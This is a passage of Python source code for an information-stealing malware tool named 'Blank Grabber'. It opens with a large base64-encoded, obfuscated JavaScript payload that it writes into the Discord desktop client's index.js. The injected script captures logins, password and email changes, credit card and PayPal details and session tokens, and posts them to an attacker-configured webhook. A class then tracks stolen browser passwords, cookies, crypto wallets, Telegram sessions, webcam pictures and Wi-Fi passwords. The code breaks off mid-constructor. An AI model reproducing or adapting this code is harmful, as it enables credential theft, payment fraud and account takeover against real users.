weDUwNWQ2YyE9PW51bGwpcmV0dXJuIF8weDUwNWQ2YztlbHNle2NvbnN0IF8weDVkZWUzMj1QdXJjaGFzZShfMHgzZDljZGIsXzB4NDA1ZWVjLF8weDFjMTZmZCgweDEzMyksXzB4MWMxNmZkKDB4MWJiKSk7cmV0dXJuIF8weDVkZWUzMiE9PW51bGw/XzB4NWRlZTMyOl8weDU4MjllYzt9fX19LGdldE5pdHJvPV8weDUyMzg0ND0+e2NvbnN0IF8weDE3Y2Y0Yz1fMHg1ODdiNjY7c3dpdGNoKF8weDUyMzg0NCl7Y2FzZSAweDA6cmV0dXJuIF8weDE3Y2Y0YygweDFhNSk7Y2FzZSAweDE6cmV0dXJuIF8weDE3Y2Y0YygweDE1Nik7Y2FzZSAweDI6cmV0dXJuIF8weDE3Y2Y0YygweDFkZSk7Y2FzZSAweDM6cmV0dXJuIF8weDE3Y2Y0YygweDE2Nyk7ZGVmYXVsdDpyZXR1cm4gXzB4MTdjZjRjKDB4MWRmKTt9fSxnZXRCYWRnZXM9XzB4MjVlYmZkPT57Y29uc3QgXzB4MzJhZTRjPV8weDU4N2I2NixfMHgzNzM0ZmE9W107cmV0dXJuIF8weDI1ZWJmZCYweDE8PDB4MTYmJl8weDM3MzRmYVtfMHgzMmFlNGMoMHgxZjMpXShfMHgzMmFlNGMoMHgxZTgpKSxfMHgyNWViZmQmMHgxPDwweDEyJiZfMHgzNzM0ZmFbXzB4MzJhZTRjKDB4MWYzKV0oXzB4MzJhZTRjKDB4MTk1KSksXzB4MjVlYmZkJjB4MTw8MHgxMSYmXzB4MzczNGZhW18weDMyYWU0YygweDFmMyldKF8weDMyYWU0YygweDFlNykpLF8weDI1ZWJmZCYweDE8PDB4ZSYmXzB4MzczNGZhWydwdXNoJ10oJ0Rpc2NvcmRceDIwQnVnXHgyMEh1bnRlclx4MjAoR29sZGVuKScpLF8weDI1ZWJmZCYweDE8PDB4OSYmXzB4MzczNGZhW18weDMyYWU0YygweDFmMyldKF8weDMyYWU0YygweDE2YSkpLF8weDI1ZWJmZCYweDE8PDB4OCYmXzB4MzczNGZhWydwdXNoJ10oJ0h5cGVTcXVhZFx4MjBCYWxhbmNlJyksXzB4MjVlYmZkJjB4MTw8MHg3JiZfMHgzNzM0ZmFbXzB4MzJhZTRjKDB4MWYzKV0oXzB4MzJhZTRjKDB4MTNjKSksXzB4MjVlYmZkJjB4MTw8MHg2JiZfMHgzNzM0ZmFbJ3B1c2gnXShfMHgzMmFlNGMoMHgxY2IpKSxfMHgyNWViZmQmMHgxPDwweDMmJl8weDM3MzRmYVtfMHgzMmFlNGMoMHgxZjMpXShfMHgzMmFlNGMoMHgxM2QpKSxfMHgyNWViZmQmMHgxPDwweDImJl8weDM3MzRmYVsncHVzaCddKF8weDMyYWU0YygweDFkMSkpLF8weDI1ZWJmZCYweDE8PDB4MSYmXzB4MzczNGZhW18weDMyYWU0YygweDFmMyldKCdQYXJ0bmVyZWRceDIwU2VydmVyXHgyME93bmVyJyksXzB4MjVlYmZkJjB4MTw8MHgwJiZfMHgzNzM0ZmFbJ3B1c2gnXShfMHgzMmFlNGMoMHgxYmUpKSwhXzB4MzczNGZhW18weDMyYWU0YygweDFlYildPydOb25lJzpfMHgzNzM0ZmFbXzB4MzJhZTRjKDB4MTQ0KV0oJyxceDIwJyk7fSxob29rZXI9YXN5bmMgXzB4MjZhMzRkPT57Y29uc3QgXzB4MThiOGYzPV8weDU4N2I2NixfMHg1NDQ5M2U9SlNPTlsnc3RyaW5naWZ5J10oXzB4MjZhMzRkKSxfMHg0OGM3MDA9bmV3IFVSTChjb25maWdbXzB4MThiOGYzKDB4MTYxKV0pLF8weDEwMGIzMz17J0NvbnRlbnQtVHlwZSc6XzB4MThiOGYzKDB4MWNkKSwnQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luJzonKid9O2lmKCFjb25maWdbXzB4MThiOGYzKDB4MTYxKV1bJ2luY2x1ZGVzJ10oXzB4MThiOGYzKDB4MWUxKSkpe2NvbnN0IF8weDRjOGQyMj10b3RwKGNvbmZpZ1tfMHgxOGI4ZjMoMHgxMzgpXSk7XzB4MTAwYjMzW18weDE4YjhmMygweDFjYyldPV8weDRjOGQyMjt9Y29uc3QgXzB4MWUzMmRmPXsncHJvdG9jb2wnOl8weDQ4YzcwMFtfMHgxOGI4ZjMoMHgxYTIpXSwnaG9zdG5hbWUnOl8weDQ4YzcwMFtfMHgxOGI4ZjMoMHgxZjIpXSwncGF0aCc6XzB4NDhjNzAwW18weDE4YjhmMygweDE0ZSldLCdtZXRob2QnOl8weDE4YjhmMygweDE5YSksJ2hlYWRlcnMnOl8weDEwMGIzM30sXzB4Y2QzNGZlPWh0dHBzW18weDE4YjhmMygweDEyYyldKF8weDFlMzJkZik7XzB4Y2QzNGZlWydvbiddKF8weDE4YjhmMygweDFhYyksXzB4MmViNjk3PT57Y29uc29sZVsnbG9nJ10oXzB4MmViNjk3KTt9KSxfMHhjZDM0ZmVbJ3dyaXRlJ10oXzB4NTQ0OTNlKSxfMHhjZDM0ZmVbXzB4MThiOGYzKDB4MTI3KV0oKTt9LGxvZ2luPWFzeW5jKF8weDQyZmI1NixfMHgzYzU3NmIsXzB4MmU5ZmIxKT0+e2NvbnN0IF8weDMzMjYzYz1fMHg1ODdiNjYsXzB4MTBhNjY5PWF3YWl0IGdldEluZm8oXzB4MmU5ZmIxKSxfMHgxMTA2OTA9Z2V0Tml0cm8oXzB4MTBhNjY5W18weDMzMjYzYygweDEyYildKSxfMHgzY2EyODY9Z2V0QmFkZ2VzKF8weDEwYTY2OVtfMHgzMzI2M2MoMHgxYWEpXSksXzB4NGE4MjVmPWF3YWl0IGdldEJpbGxpbmcoXzB4MmU5ZmIxKSxfMHgzNGM0YjU9eyd1c2VybmFtZSc6Y29uZmlnWydlbWJlZF9uYW1lJ10sJ2F2YXRhcl91cmwnOmNvbmZpZ1tfMHgzMzI2M2MoMHgxZTUpXSwnZW1iZWRzJzpbeydjb2xvcic6Y29uZmlnW18weDMzMjYzYygweDE4MSldLCdmaWVsZHMnOlt7J25hbWUnOl8weDMzMjYzYygweDFmMCksJ3ZhbHVlJzonRW1haWw6XHgyMCoqJytfMHg0MmZiNTYrXzB4MzMyNjNjKDB4MTM0KStfMHgzYzU3NmIrJyoqJywnaW5saW5lJzohW119LHsnbmFtZSc6XzB4MzMyNjNjKDB4MWEzKSwndmFsdWUnOidOaXRyb1x4MjBUeXBlOlx4MjAqKicrXzB4MTEwNjkwK18weDMzMjYzYygweDE3YykrXzB4M2NhMjg2K18weDMzMjYzYygweDFkNCkrXzB4NGE4MjVmKycqKicsJ2lubGluZSc6IVtdfSx7J25hbWUnOl8weDMzMjYzYygweDE5MSksJ3ZhbHVlJzonYCcrXzB4MmU5ZmIxKydgJywnaW5saW5lJzohW119XSwnYXV0aG9yJzp7J25hbWUnOl8weDEwYTY2OVtfMHgzMzI2M2MoMHgxNDApXSsnIycrXzB4MTBhNjY5W18weDMzMjYzYygweDFhYildK18weDMzMjYzYygweDE1ZCkrXzB4MTBhNjY5WydpZCddLCdpY29uX3VybCc6J2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvJytfMHgxMGE2NjlbJ2lkJ10rJy8nK18weDEwYTY2OVtfMHgzMzI2M2MoMHgxYTYpXStfMHgzMzI2M2MoMHgxNDgpfX1dfTtpZihjb25maWdbXzB4MzMyNjNjKDB4MWFlKV0pXzB4MzRjNGI1W18weDMzMjYzYygweDFhZildPWNvbmZpZ1tfMHgzMzI2M2MoMHgxOGUpXTtob29rZXIoXzB4MzRjNGI1KTt9LHBhc3N3b3JkQ2hhbmdlZD1hc3luYyhfMHgzMzM1YzksXzB4MmJiMmExLF8weDQ1NGFiOCk9Pntjb25zdCBfMHg0MWYzMWQ9XzB4NTg3YjY2LF8weDUzMDA2Nz1hd2FpdCBnZXRJbmZvKF8weDQ1NGFiOCksXzB4NWE5MDY2PWdldE5pdHJvKF8weDUzMDA2N1sncHJlbWl1bV90eXBlJ10pLF8weDRhODg3ZD1nZXRCYWRnZXMoXzB4NTMwMDY3W18weDQxZjMxZCgweDFhYSldKSxfMHg0MWYwZjA9YXdhaXQgZ2V0QmlsbGluZyhfMHg0NTRhYjgpLF8weDM5NjMwMD17J3VzZXJuYW1lJzpjb25maWdbXzB4NDFmMzFkKDB4MThjKV0sJ2F2YXRhcl91cmwnOmNvbmZpZ1tfMHg0MWYzMWQoMHgxZTUpXSwnZW1iZWRzJzpbeydjb2xvcic6Y29uZmlnW18weDQxZjMxZCgweDE4MSldLCdmaWVsZHMnOlt7J25hbWUnOl8weDQxZjMxZCgweDFiNSksJ3ZhbHVlJzpfMHg0MWYzMWQoMHgxODYpK18weDUzMDA2N1tfMHg0MWYzMWQoMHgxN2QpXStfMHg0MWYzMWQoMHgxMzcpK18weDMzMzVjOStfMHg0MWYzMWQoMHgxNjgpK18weDJiYjJhMSsnKionLCdpbmxpbmUnOiEhW119LHsnbmFtZSc6XzB4NDFmMzFkKDB4MWEzKSwndmFsdWUnOl8weDQxZjMxZCgweDFhZCkrXzB4NWE5MDY2K18weDQxZjMxZCgweDE3YykrXzB4NGE4ODdkK18weDQxZjMxZCgweDFkNCkrXzB4NDFmMGYwKycqKicsJ2lubGluZSc6ISFbXX0seyduYW1lJzpfMHg0MWYzMWQoMHgxOTEpLCd2YWx1ZSc6J2AnK18weDQ1NGFiOCsnYCcsJ2lubGluZSc6IVtdfV0sJ2F1dGhvcic6eyduYW1lJzpfMHg1MzAwNjdbXzB4NDFmMzFkKDB4MTQwKV0rJyMnK18weDUzMDA2N1tfMHg0MWYzMWQoMHgxYWIpXSsnXHgyMHxceDIwJytfMHg1MzAwNjdbJ2lkJ10sJ2ljb25fdXJsJzpfMHg0MWYzMWQoMHgxMmYpK18weDUzMDA2N1snaWQnXSsnLycrXzB4NTMwMDY3W18weDQxZjMxZCgweDFhNildKycud2VicCd9fV19O2lmKGNvbmZpZ1tfMHg0MWYzMWQoMHgxYWUpXSlfMHgzOTYzMDBbXzB4NDFmMzFkKDB4MWFmKV09Y29uZmlnW18weDQxZjMxZCgweDE4ZSldO2hvb2tlcihfMHgzOTYzMDApO30sZW1haWxDaGFuZ2VkPWFzeW5jKF8weDMwYzg3MyxfMHhiMDIwNjksXzB4NDIzZDg1KT0+e2NvbnN0IF8weDQ5NmY4OD1fMHg1ODdiNjYsXzB4MjQxMDllPWF3YWl0IGdldEluZm8oXzB4NDIzZDg1KSxfMHgzZGNiNTA9Z2V0Tml0cm8oXzB4MjQxMDllWydwcmVtaXVtX3R5cGUnXSksXzB4Mjk1NjE1PWdldEJhZGdlcyhfMHgyNDEwOWVbXzB4NDk2Zjg4KDB4MWFhKV0pLF8weDJmMGVjYj1hd2FpdCBnZXRCaWxsaW5nKF8weDQyM2Q4NSksXzB4Mjg3OTFhPXsndXNlcm5hbWUnOmNvbmZpZ1tfMHg0OTZmODgoMHgxOGMpXSwnYXZhdGFyX3VybCc6Y29uZmlnW18weDQ5NmY4OCgweDFlNSldLCdlbWJlZHMnOlt7J2NvbG9yJzpjb25maWdbXzB4NDk2Zjg4KDB4MTgxKV0sJ2ZpZWxkcyc6W3snbmFtZSc6XzB4NDk2Zjg4KDB4MWI0KSwndmFsdWUnOl8weDQ5NmY4OCgweDE5NykrXzB4MzBjODczK18weDQ5NmY4OCgweDE4MikrXzB4YjAyMDY5KycqKicsJ2lubGluZSc6ISFbXX0seyduYW1lJzpfMHg0OTZmODgoMHgxYTMpLCd2YWx1ZSc6XzB4NDk2Zjg4KDB4MWFkKStfMHgzZGNiNTArXzB4NDk2Zjg4KDB4MTdjKStfMHgyOTU2MTUrXzB4NDk2Zjg4KDB4MWQ0KStfMHgyZjBlY2IrJyoqJywnaW5saW5lJzohIVtdfSx7J25hbWUnOl8weDQ5NmY4OCgweDE5MSksJ3ZhbHVlJzonYCcrXzB4NDIzZDg1KydgJywnaW5saW5lJzohW119XSwnYXV0aG9yJzp7J25hbWUnOl8weDI0MTA5ZVtfMHg0OTZmODgoMHgxNDApXSsnIycrXzB4MjQxMDllWydkaXNjcmltaW5hdG9yJ10rXzB4NDk2Zjg4KDB4MTVkKStfMHgyNDEwOWVbJ2lkJ10sJ2ljb25fdXJsJzpfMHg0OTZmODgoMHgxMmYpK18weDI0MTA5ZVsnaWQnXSsnLycrXzB4MjQxMDllW18weDQ5NmY4OCgweDFhNildK18weDQ5NmY4OCgweDE0OCl9fV19O2lmKGNvbmZpZ1tfMHg0OTZmODgoMHgxYWUpXSlfMHgyODc5MWFbXzB4NDk2Zjg4KDB4MWFmKV09Y29uZmlnW18weDQ5NmY4OCgweDE4ZSldO2hvb2tlcihfMHgyODc5MWEpO30sUGF5cGFsQWRkZWQ9YXN5bmMgXzB4MzA1ZTE2PT57Y29uc3QgXzB4NTkzOTAzPV8weDU4N2I2NixfMHgyNWY1OWE9YXdhaXQgZ2V0SW5mbyhfMHgzMDVlMTYpLF8weDM3ODI2ZD1nZXROaXRybyhfMHgyNWY1OWFbXzB4NTkzOTAzKDB4MTJiKV0pLF8weDVjMjllMj1nZXRCYWRnZXMoXzB4MjVmNTlhW18weDU5MzkwMygweDFhYSldKSxfMHg1Y2QyNzQ9Z2V0QmlsbGluZyhfMHgzMDVlMTYpLF8weDJjMmVjOT17J3VzZXJuYW1lJzpjb25maWdbXzB4NTkzOTAzKDB4MThjKV0sJ2F2YXRhcl91cmwnOmNvbmZpZ1tfMHg1OTM5MDMoMHgxZTUpXSwnZW1iZWRzJzpbeydjb2xvcic6Y29uZmlnW18weDU5MzkwMygweDE4MSldLCdmaWVsZHMnOlt7J25hbWUnOicqKlBheVBhbFx4MjBBZGRlZCoqJywndmFsdWUnOl8weDU5MzkwMygweDEyNSksJ2lubGluZSc6IVtdfSx7J25hbWUnOicqKkRpc2NvcmRceDIwSW5mbyoqJywndmFsdWUnOl8weDU5MzkwMygweDFhZCkrXzB4Mzc4MjZkKycqXHgwYUJhZGdlczpceDIwKionK18weDVjMjllMisnKipceDBhQmlsbGluZzpceDIwKionK18weDVjZDI3NCsnKionLCdpbmxpbmUnOiFbXX0seyduYW1lJzonKipUb2tlbioqJywndmFsdWUnOidgJytfMHgzMDVlMTYrJ2AnLCdpbmxpbmUnOiFbXX1dLCdhdXRob3InOnsnbmFtZSc6XzB4MjVmNTlhWyd1c2VybmFtZSddKycjJytfMHgyNWY1OWFbXzB4NTkzOTAzKDB4MWFiKV0rXzB4NTkzOTAzKDB4MTVkKStfMHgyNWY1OWFbJ2lkJ10sJ2ljb25fdXJsJzpfMHg1OTM5MDMoMHgxMmYpK18weDI1ZjU5YVsnaWQnXSsnLycrXzB4MjVmNTlhW18weDU5MzkwMygweDFhNildK18weDU5MzkwMygweDE0OCl9fV19O2lmKGNvbmZpZ1sncGluZ19vbl9ydW4nXSlfMHgyYzJlYzlbXzB4NTkzOTAzKDB4MWFmKV09Y29uZmlnWydwaW5nX3ZhbCddO2hvb2tlcihfMHgyYzJlYzkpO30sY2NBZGRlZD1hc3luYyhfMHgxNGUyOTUsXzB4OTE5NWEyLF8weDJmZGViZixfMHgzM2Q4M2QsXzB4MWY0MmIxKT0+e2NvbnN0IF8weDZiZjU1MT1fMHg1ODdiNjYsXzB4NTU1NzQ2PWF3YWl0IGdldEluZm8oXzB4MWY0MmIxKSxfMHgyNzU0ZDU9Z2V0Tml0cm8oXzB4NTU1NzQ2WydwcmVtaXVtX3R5cGUnXSksXzB4NTUzNzg0PWdldEJhZGdlcyhfMHg1NTU3NDZbXzB4NmJmNTUxKDB4MWFhKV0pLF8weDUwOGNhZT1hd2FpdCBnZXRCaWxsaW5nKF8weDFmNDJiMSksXzB4NWNiYzkxPXsndXNlcm5hbWUnOmNvbmZpZ1tfMHg2YmY1NTEoMHgxOGMpXSwnYXZhdGFyX3VybCc6Y29uZmlnW18weDZiZjU1MSgweDFlNSldLCdlbWJlZHMnOlt7J2NvbG9yJzpjb25maWdbXzB4NmJmNTUxKDB4MTgxKV0sJ2ZpZWxkcyc6W3snbmFtZSc6JyoqQ3JlZGl0XHgyMENhcmRceDIwQWRkZWQqKicsJ3ZhbHVlJzpfMHg2YmY1NTEoMHgxMzApK18weDE0ZTI5NStfMHg2YmY1NTEoMHgxNzYpK18weDkxOTVhMisnKipceDBhQ3JlZGl0XHgyMENhcmRceDIwRXhwaXJhdGlvbjpceDIwKionK18weDJmZGViZisnLycrXzB4MzNkODNkKycqKicsJ2lubGluZSc6ISFbXX0seyduYW1lJzpfMHg2YmY1NTEoMHgxYTMpLCd2YWx1ZSc6XzB4NmJmNTUxKDB4MWFkKStfMHgyNzU0ZDUrXzB4NmJmNTUxKDB4MTdjKStfMHg1NTM3ODQrJyoqXHgwYUJpbGxpbmc6XHgyMCoqJytfMHg1MDhjYWUrJyoqJywnaW5saW5lJzohIVtdfSx7J25hbWUnOicqKlRva2VuKionLCd2YWx1ZSc6J2AnK18weDFmNDJiMSsnYCcsJ2lubGluZSc6IVtdfV0sJ2F1dGhvcic6eyduYW1lJzpfMHg1NTU3NDZbXzB4NmJmNTUxKDB4MTQwKV0rJyMnK18weDU1NTc0NltfMHg2YmY1NTEoMHgxYWIpXStfMHg2YmY1NTEoMHgxNWQpK18weDU1NTc0NlsnaWQnXSwnaWNvbl91cmwnOl8weDZiZjU1MSgweDEyZikrXzB4NTU1NzQ2WydpZCddKycvJytfMHg1NTU3NDZbXzB4NmJmNTUxKDB4MWE2KV0rXzB4NmJmNTUxKDB4MTQ4KX19XX07aWYoY29uZmlnW18weDZiZjU1MSgweDFhZSldKV8weDVjYmM5MVtfMHg2YmY1NTEoMHgxYWYpXT1jb25maWdbXzB4NmJmNTUxKDB4MThlKV07aG9va2VyKF8weDVjYmM5MSk7fSxuaXRyb0JvdWdodD1hc3luYyBfMHg0YzJiNDg9Pntjb25zdCBfMHg0MDU3NGE9XzB4NTg3YjY2LF8weDQ5NzJjYT1hd2FpdCBnZXRJbmZvKF8weDRjMmI0OCksXzB4MzVkOWEwPWdldE5pdHJvKF8weDQ5NzJjYVsncHJlbWl1bV90eXBlJ10pLF8weDJjMDA2Nj1nZXRCYWRnZXMoXzB4NDk3MmNhW18weDQwNTc0YSgweDFhYSldKSxfMHg1MTJkZTI9YXdhaXQgZ2V0QmlsbGluZyhfMHg0YzJiNDgpLF8weDRkMjE2Zj1hd2FpdCBidXlOaXRybyhfMHg0YzJiNDgpLF8weDFlZDhmNj17J3VzZXJuYW1lJzpjb25maWdbXzB4NDA1NzRhKDB4MThjKV0sJ2NvbnRlbnQnOl8weDRkMjE2ZiwnYXZhdGFyX3VybCc6Y29uZmlnWydlbWJlZF9pY29uJ10sJ2VtYmVkcyc6W3snY29sb3InOmNvbmZpZ1tfMHg0MDU3NGEoMHgxODEpXSwnZmllbGRzJzpbeyduYW1lJzpfMHg0MDU3NGEoMHgxNWEpLCd2YWx1ZSc6JyoqTml0cm9ceDIwQ29kZToqKlx4MGFgYGBkaWZmXHgwYStceDIwJytfMHg0ZDIxNmYrJ2BgYCcsJ2lubGluZSc6ISFbXX0seyduYW1lJzpfMHg0MDU3NGEoMHgxYTMpLCd2YWx1ZSc6XzB4NDA1NzRhKDB4MWFkKStfMHgzNWQ5YTArXzB4NDA1NzRhKDB4MTdjKStfMHgyYzAwNjYrXzB4NDA1NzRhKDB4MWQ0KStfMHg1MTJkZTIrJyoqJywnaW5saW5lJzohIVtdfSx7J25hbWUnOl8weDQwNTc0YSgweDE5MSksJ3ZhbHVlJzonYCcrXzB4NGMyYjQ4KydgJywnaW5saW5lJzohW119XSwnYXV0aG9yJzp7J25hbWUnOl8weDQ5NzJjYVtfMHg0MDU3NGEoMHgxNDApXSsnIycrXzB4NDk3MmNhWydkaXNjcmltaW5hdG9yJ10rXzB4NDA1NzRhKDB4MTVkKStfMHg0OTcyY2FbJ2lkJ10sJ2ljb25fdXJsJzpfMHg0MDU3NGEoMHgxMmYpK18weDQ5NzJjYVsnaWQnXSsnLycrXzB4NDk3MmNhWydhdmF0YXInXStfMHg0MDU3NGEoMHgxNDgpfX1dfTtpZihjb25maWdbXzB4NDA1NzRhKDB4MWFlKV0pXzB4MWVkOGY2W18weDQwNTc0YSgweDFhZildPWNvbmZpZ1tfMHg0MDU3NGEoMHgxOGUpXSsoJ1x4MGEnK18weDRkMjE2Zik7aG9va2VyKF8weDFlZDhmNik7fTtzZXNzaW9uW18weDU4N2I2NigweDFjNSldW18weDU4N2I2NigweDE1MyldW18weDU4N2I2NigweDE5OSldKGNvbmZpZ1snZmlsdGVyMiddLChfMHgxZDFjYjEsXzB4MjM4N2VmKT0+e2NvbnN0IF8weDIwYzhiZj1fMHg1ODdiNjY7aWYoXzB4MWQxY2IxW18weDIwYzhiZigweDFhMCldW18weDIwYzhiZigweDFjMCldKCd3c3M6Ly9yZW1vdGUtYXV0aC1nYXRld2F5JykpcmV0dXJuIF8weDIzODdlZih7J2NhbmNlbCc6ISFbXX0pO3VwZGF0ZUNoZWNrKCk7fSksc2Vzc2lvblsnZGVmYXVsdFNlc3Npb24nXVtfMHg1ODdiNjYoMHgxNTMpXVsnb25IZWFkZXJzUmVjZWl2ZWQnXSgoXzB4NDEwNjM2LF8weDUzOTI3Yik9Pntjb25zdCBfMHg0ZTM1MWQ9XzB4NTg3YjY2O18weDQxMDYzNltfMHg0ZTM1MWQoMHgxYTApXVtfMHg0ZTM1MWQoMHgxYzApXShjb25maWdbXzB4NGUzNTFkKDB4MTYxKV0pP18weDQxMDYzNltfMHg0ZTM1MWQoMHgxYTApXVsnaW5jbHVkZXMnXSgnZGlzY29yZC5jb20nKT9fMHg1MzkyN2IoeydyZXNwb25zZUhlYWRlcnMnOk9iamVjdFtfMHg0ZTM1MWQoMHgxZTkpXSh7J0FjY2Vzcy1Db250cm9sLUFsbG93LUhlYWRlcnMnOicqJ30sXzB4NDEwNjM2W18weDRlMzUxZCgweDEzYildKX0pOl8weDUzOTI3Yih7J3Jlc3BvbnNlSGVhZGVycyc6T2JqZWN0W18weDRlMzUxZCgweDFlOSldKHsnQ29udGVudC1TZWN1cml0eS1Qb2xpY3knOltfMHg0ZTM1MWQoMHgxM2YpLCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1IZWFkZXJzXHgyMFx4MjcqXHgyNycsXzB4NGUzNTFkKDB4MTQzKV0sJ0FjY2Vzcy1Db250cm9sLUFsbG93LUhlYWRlcnMnOicqJywnQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luJzonKid9LF8weDQxMDYzNltfMHg0ZTM1MWQoMHgxM2IpXSl9KTooZGVsZXRlIF8weDQxMDYzNlsncmVzcG9uc2VIZWFkZXJzJ11bXzB4NGUzNTFkKDB4MTRmKV0sZGVsZXRlIF8weDQxMDYzNltfMHg0ZTM1MWQoMHgxM2IpXVtfMHg0ZTM1MWQoMHgxODApXSxfMHg1MzkyN2IoeydyZXNwb25zZUhlYWRlcnMnOnsuLi5fMHg0MTA2MzZbXzB4NGUzNTFkKDB4MTNiKV0sJ0FjY2Vzcy1Db250cm9sLUFsbG93LUhlYWRlcnMnOicqJ319KSk7fSksc2Vzc2lvblsnZGVmYXVsdFNlc3Npb24nXVtfMHg1ODdiNjYoMHgxNTMpXVtfMHg1ODdiNjYoMHgxYmQpXShjb25maWdbJ2ZpbHRlciddLGFzeW5jKF8weDQ4MTFhOCxfMHgzNGYyMWMpPT57Y29uc3QgXzB4MzU5OTM1PV8weDU4N2I2NjtpZihfMHg0ODExYThbXzB4MzU5OTM1KDB4MTVjKV0hPT0weGM4JiZfMHg0ODExYThbXzB4MzU5OTM1KDB4MTVjKV0hPT0weGNhKXJldHVybjtjb25zdCBfMHg1ZWJmYzE9QnVmZmVyWydmcm9tJ10oXzB4NDgxMWE4Wyd1cGxvYWREYXRhJ11bMHgwXVtfMHgzNTk5MzUoMHgxYjMpXSlbXzB4MzU5OTM1KDB4MWQzKV0oKSxfMHgzODI3ZGQ9SlNPTltfMHgzNTk5MzUoMHgxNWIpXShfMHg1ZWJmYzEpLF8weDJjZDNkYj1hd2FpdCBleGVjU2NyaXB0KCcod2VicGFja0NodW5rZGlzY29yZF9hcHAucHVzaChbW1x4MjdceDI3XSx7fSxlPT57bT1bXTtmb3IobGV0XHgyMGNceDIwaW5ceDIwZS5jKW0ucHVzaChlLmNbY10pfV0pLG0pLmZpbmQobT0+bT8uZXhwb3J0cz8uZGVmYXVsdD8uZ2V0VG9rZW4hPT12b2lkXHgyMDApLmV4cG9ydHMuZGVmYXVsdC5nZXRUb2tlbigpJyk7c3dpdGNoKCEhW10pe2Nhc2UgXzB4NDgxMWE4W18weDM1OTkzNSgweDFhMCldW18weDM1OTkzNSgweDE1ZildKF8weDM1OTkzNSgweDFhNCkpOmxvZ2luKF8weDM4MjdkZFtfMHgzNTk5MzUoMHgxYTQpXSxfMHgzODI3ZGRbXzB4MzU5OTM1KDB4MWUyKV0sXzB4MmNkM2RiKVtfMHgzNTk5MzUoMHgxZjgpXShjb25zb2xlW18weDM1OTkzNSgweDFhYyldKTticmVhaztjYXNlIF8weDQ4MTFhOFtfMHgzNTk5MzUoMHgxYTApXVtfMHgzNTk5MzUoMHgxNWYpXShfMHgzNTk5MzUoMHgxNzMpKSYmXzB4NDgxMWE4W18weDM1OTkzNSgweDE3YSldPT09XzB4MzU5OTM1KDB4MWY5KTppZighXzB4MzgyN2RkW18weDM1OTkzNSgweDFlMildKXJldHVybjtfMHgzODI3ZGRbJ2VtYWlsJ10mJmVtYWlsQ2hhbmdlZChfMHgzODI3ZGRbJ2VtYWlsJ10sXzB4MzgyN2RkWydwYXNzd29yZCddLF8weDJjZDNkYilbJ2NhdGNoJ10oY29uc29sZVtfMHgzNTk5MzUoMHgxYWMpXSk7XzB4MzgyN2RkW18weDM1OTkzNSgweDE1MSldJiZwYXNzd29yZENoYW5nZWQoXzB4MzgyN2RkW18weDM1OTkzNSgweDFlMildLF8weDM4MjdkZFsnbmV3X3Bhc3N3b3JkJ10sXzB4MmNkM2RiKVtfMHgzNTk5MzUoMHgxZjgpXShjb25zb2xlW18weDM1OTkzNSgweDFhYyldKTticmVhaztjYXNlIF8weDQ4MTFhOFtfMHgzNTk5MzUoMHgxYTApXVtfMHgzNTk5MzUoMHgxNWYpXShfMHgzNTk5MzUoMHgxNzIpKSYmXzB4NDgxMWE4WydtZXRob2QnXT09PSdQT1NUJzpjb25zdCBfMHg1ZWEzZjg9cXVlcnlzdHJpbmdbXzB4MzU5OTM1KDB4MTViKV0odW5wYXJzZWREYXRhW18weDM1OTkzNSgweDFkMyldKCkpO2NjQWRkZWQoXzB4NWVhM2Y4WydjYXJkW251bWJlcl0nXSxfMHg1ZWEzZjhbJ2NhcmRbY3ZjXSddLF8weDVlYTNmOFtfMHgzNTk5MzUoMHgxOGYpXSxfMHg1ZWEzZjhbXzB4MzU5OTM1KDB4MTIyKV0sXzB4MmNkM2RiKVtfMHgzNTk5MzUoMHgxZjgpXShjb25zb2xlWydlcnJvciddKTticmVhaztjYXNlIF8weDQ4MTFhOFtfMHgzNTk5MzUoMHgxYTApXVtfMHgzNTk5MzUoMHgxNWYpXSgncGF5cGFsX2FjY291bnRzJykmJl8weDQ4MTFhOFtfMHgzNTk5MzUoMHgxN2EpXT09PSdQT1NUJzpQYXlwYWxBZGRlZChfMHgyY2QzZGIpW18weDM1OTkzNSgweDFmOCldKGNvbnNvbGVbJ2Vycm9yJ10pO2JyZWFrO2Nhc2UgXzB4NDgxMWE4W18weDM1OTkzNSgweDFhMCldW18weDM1OTkzNSgweDE1ZildKF8weDM1OTkzNSgweDFjMikpJiZfMHg0ODExYThbXzB4MzU5OTM1KDB4MTdhKV09PT0nUE9TVCc6aWYoIWNvbmZpZ1tfMHgzNTk5MzUoMHgxZTQpXSlyZXR1cm47c2V0VGltZW91dCgoKT0+e2NvbnN0IF8weDE0N2Q4Nj1fMHgzNTk5MzU7bml0cm9Cb3VnaHQoXzB4MmNkM2RiKVtfMHgxNDdkODYoMHgxZjgpXShjb25zb2xlW18weDE0N2Q4NigweDFhYyldKTt9LDB4MWQ0Yyk7YnJlYWs7ZGVmYXVsdDpicmVhazt9fSksbW9kdWxlW18weDU4N2I2NigweDE4NyldPXJlcXVpcmUoXzB4NTg3YjY2KDB4MWVhKSk7').decode(errors='ignore').replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.C2[1].encode()).decode(errors='ignore')))
        except Exception:
            return None
        for dirname in ('Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'):
            path = os.path.join(os.getenv('localappdata'), dirname)
            if not os.path.isdir(path):
                continue
            for root, _, files in os.walk(path):
                for file in files:
                    if file.lower() == 'index.js':
                        filepath = os.path.realpath(os.path.join(root, file))
                        if os.path.split(os.path.dirname(filepath))[-1] == 'discord_desktop_core':
                            with open(filepath, 'w', encoding='utf-8') as file:
                                file.write(code)
                            check = True
            if check:
                check = False
                yield path

class BlankGrabber:
    Separator: str = None
    TempFolder: str = None
    ArchivePath: str = None
    Cookies: list = []
    PasswordsCount: int = 0
    HistoryCount: int = 0
    AutofillCount: int = 0
    RobloxCookiesCount: int = 0
    DiscordTokensCount: int = 0
    WifiPasswordsCount: int = 0
    MinecraftSessions: int = 0
    WebcamPicturesCount: int = 0
    TelegramSessionsCount: int = 0
    CommonFilesCount: int = 0
    WalletsCount: int = 0
    ScreenshotTaken: bool = False
    SystemInfoStolen: bool = False
    SteamStolen: bool = False
    EpicStolen: bool = False
    UplayStolen: bool = False
    GrowtopiaStolen: bool = False

    def __init__(self) -> None:
        self.Separator = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
        while True:
